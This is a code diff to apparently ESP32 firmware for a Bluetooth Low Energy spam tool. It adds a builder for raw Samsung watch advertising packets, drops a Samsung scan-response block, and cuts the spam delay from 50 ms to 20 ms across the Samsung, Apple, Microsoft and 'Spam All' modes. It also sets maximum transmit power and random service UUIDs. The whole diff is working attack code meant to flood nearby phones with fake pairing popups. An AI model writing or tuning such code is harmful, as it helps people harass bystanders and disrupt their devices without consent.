@@ -119,6 +119,33 @@ uint8_t* createApplePacket(uint8_t deviceType, bool isContinuity = false) {
     }
 }
 
+uint8_t* build_samsung_raw_packet(uint8_t watch_id, size_t* out_len) {
+    const uint16_t MANUFACTURER_ID = 0x0075;
+    size_t man_len = 2 + sizeof(SAMSUNG_PREPENDED_BYTES) + 1;
+    uint8_t* man_data = (uint8_t*)malloc(man_len);
+    
+    man_data[0] = MANUFACTURER_ID & 0xFF;
+    man_data[1] = MANUFACTURER_ID >> 8;
+    memcpy(man_data + 2, SAMSUNG_PREPENDED_BYTES, sizeof(SAMSUNG_PREPENDED_BYTES));
+    man_data[2 + sizeof(SAMSUNG_PREPENDED_BYTES)] = watch_id;
+    
+    const uint8_t flags[] = {0x02,0x01,0x06};
+    size_t total_len = sizeof(flags) + 2 + man_len;
+    uint8_t* adv = (uint8_t*)malloc(total_len);
+    
+    size_t idx = 0;
+    memcpy(adv + idx, flags, sizeof(flags));
+    idx += sizeof(flags);
+    adv[idx++] = man_len + 1;
+    adv[idx++] = 0xFF;
+    memcpy(adv + idx, man_data, man_len);
+    idx += man_len;
+    
+    free(man_data);
+    *out_len = idx;
+    return adv;
+}
+
 BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int specific_index = -1) {
     BLEAdvertisementData AdvData = BLEAdvertisementData();
 
@@ -259,14 +286,6 @@ void executeSpam(EBLEPayloadType type, int delayMs = 20, int specific_index = -1
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
     pAdvertising = BLEDevice::getAdvertising();
     BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type, specific_index);
-    
-    if(type == SamsungWatch || type == SamsungBuds) {
-        BLEAdvertisementData scanResponseData = BLEAdvertisementData();
-        uint8_t scanResponsePayload[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-        scanResponseData.setManufacturerData(std::string((char*)scanResponsePayload, 13));
-        pAdvertising->setScanResponseData(scanResponseData);
-    }
-    
     NimBLEUUID uuid((uint32_t)(random() & 0xFFFFFF));
     pAdvertising->addServiceUUID(uuid);
     pAdvertising->setAdvertisementData(advertisementData);
@@ -328,12 +347,12 @@ void aj_adv(int ble_choice) {
                     break;
                 case 2:
                     displayTextLine("Samsung Watch (" + String(count) + ")");
-                    executeSpam(SamsungWatch, 50, samsung_index);
+                    executeSpam(SamsungWatch, 20, samsung_index);
                     samsung_index = (samsung_index + 1) % 26;
                     break;
                 case 3:
                     displayTextLine("Samsung Buds (" + String(count) + ")");
-                    executeSpam(SamsungBuds, 50);
+                    executeSpam(SamsungBuds, 20);
                     break;
                 case 4:
                     displayTextLine("Google FastPair (" + String(count) + ")");
@@ -342,10 +361,10 @@ void aj_adv(int ble_choice) {
                 case 5:
                     displayTextLine("Spam All (" + String(count) + ")");
                     switch(spam_all_index % 4) {
-                        case 0: executeSpam(AppleIOS, 50); break;
-                        case 1: executeSpam(SamsungWatch, 50, random(26)); break;
-                        case 2: executeSpam(SamsungBuds, 50); break;
-                        case 3: executeSpam(Microsoft, 50); break;
+                        case 0: executeSpam(AppleIOS, 20); break;
+                        case 1: executeSpam(SamsungWatch, 20, random(26)); break;
+                        case 2: executeSpam(SamsungBuds, 20); break;
+                        case 3: executeSpam(Microsoft, 20); break;
                     }
                     spam_all_index++;
                     break;
